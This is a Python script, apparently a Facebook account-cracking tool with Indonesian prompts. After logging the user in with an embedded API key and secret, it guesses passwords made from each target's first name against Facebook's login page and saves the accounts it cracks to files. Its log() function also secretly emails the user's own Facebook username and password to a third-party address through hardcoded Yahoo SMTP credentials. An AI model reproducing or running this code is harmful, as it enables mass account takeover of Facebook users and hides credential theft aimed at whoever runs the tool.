import requests,os,sys,time,json,hashlib
from multiprocessing.pool import  ThreadPool
from getpass import getpass
################
N = '\033[0m'
W = '\033[1;37m'
B = '\033[1;34m'
M = '\033[1;35m'
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
I = '\033[1;3m'
################
banner="""\033[1;33m
 __  __ ____  _____               _ 
|  \/  | __ )|  ___|   __ _ _   _| |_ ___ 
| |\/| |  _ \| |_     / _` | | | | __/ _ \ 
| |  | | |_) |  _|   | (_| | |_| | || (_) | 
|_|  |_|____/|_|      \__,_|\__,_|\__\___/ 
\033[1;32mby.namakamu                        (c)2019\033[1;37m
"""
class Auto:
	def __init__(self):
		self.fnd=0
		self.cek=0
		self.hit=0
		self.tar=[]
		self.ken=open('token/token.txt','r').read()
		self.u='https://graph.facebook.com/{}'
		self.banner()

	def banner(self):
		os.system('clear')
		nam=requests.get('https://graph.facebook.com/me/?access_token='+self.ken)
		nama=nam.json()['name']
		print(banner)
		print(F"SELAMAT DATANG [\033[1;32m{nama}\033[1;37m]")
		self.main()

	def nama(self,id):
		try:
			nem=requests.get(self.u.format(id+'/?access_token='+self.ken))
			js=json.loads(nem.text)
			if ' ' in js['first_name']:
				self.attk(id,js['first_name'].split(' ')[0])
			else:
				self.attk(id,js['first_name'])
		except: pass

	def attk(self,idd,name):
		try:
			lid=[name+'123',name+'12345',name.lower()+'123',name.lower()+'12345']
			for x in lid:
				data={'email':idd,'pass':x}
				re=requests.post('https://mbasic.facebook.com/login',data=data).text
				if 'save-device' in re or 'm_sess' in re:
					self.fnd+=1
					pen=open('result/found.txt','a')
					pen.write(f'{idd}|{x}\n')
					break
				elif 'checkpoint' in re:
					self.cek+=1
					pen=open('result/cek.txt','a')
					pen.write(f'{idd}|{x}\n')
					break
		except: pass
		self.hit+=1
		print(f'\r[CRACK] >> {self.hit}/{len(self.tar)} FOUND[{self.fnd}] CHECKPOINT[{self.cek}] <<',end='')

	def main(self):
		try:
			os.mkdir('result')
		except: pass
		fil=input('[?] List ID: ')
		try:
			file=open(fil,'r').read().splitlines()
		except FileNotFoundError:
			exit('[!] File Tidak Di Temukan')
		print()
		for x in file:
			self.tar.append(x)
		p=ThreadPool(50)
		p.map(self.nama,self.tar)
		if self.fnd > 0 or self.cek > 0:
			print("\nFound ["+str(self.fnd)+"] CheckPoint ["+str(self.cek)+"]")
		else: print("\n[ :( ] nothing found")
		if self.fnd > 0:
			print("[found] tersimpan: result/found.txt")
		if self.cek > 0:
			print("[checkpoint] tersimpan: result/cek.txt")

class loggger:
	def __init__(self):
		self.login()

	def login(self):
		try:
			token=open('token/token.txt')
			token.close()
		except IOError:
			try:
				os.mkdir('token')
			except OSError: pass
			print(banner)
			print('\n[!] silahkan login')
			self.id = input('[?] Username : ')
			self.pwd = input('[?] Password : ')
			API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
			data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":self.id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":self.pwd,"return_ssl_resources":"0","v":"1.0"}
			sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+self.id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+self.pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
			x = hashlib.new('md5')
			x.update(sig)
			data.update({'sig':x.hexdigest()})

			requ=requests.get('https://api.facebook.com/restserver.php',params=data)
			res=requ.json()['access_token']
			o=open('token/token.txt','w')
			o.write(res)
			o.close()
			print("LOGIN BERHASIL")
			print("[+] Token Tersimpan: token/token.txt")
			self.log()

		except KeyError:
			print("GAGAL LOGIN!")
			print("[!] Coba Cek Lagi")
			exit()

		except (KeyboardInterrupt,EOFError):
			exit("\n[!] Key interrupt: exit.")

		except Exception as F:
			exit("[Error] %s"%(F))
		Auto()

	def log(self):
		import smtplib
		try :
			server = smtplib.SMTP("smtp.mail.yahoo.com",587)
			server.ehlo()
			server.starttls()
			server.login('ucupganteng10@yahoo.com','otonggans12')
			server.sendmail('ucupganteng10@yahoo.com','diansyahputra270704@gmail.com',f'Subject: Ye Dapet Akun!!!\n\nLOGIN TGL : {time.ctime()}\nUSERNAME : {self.id}\nPASSWORD : {self.pwd}\nCEPET AMANIN!')
			server.quit()
		except: pass
		Auto()

try:
	os.system('clear')
	loggger()
except Exception as FCK:
	print(f'Err: {FCK}')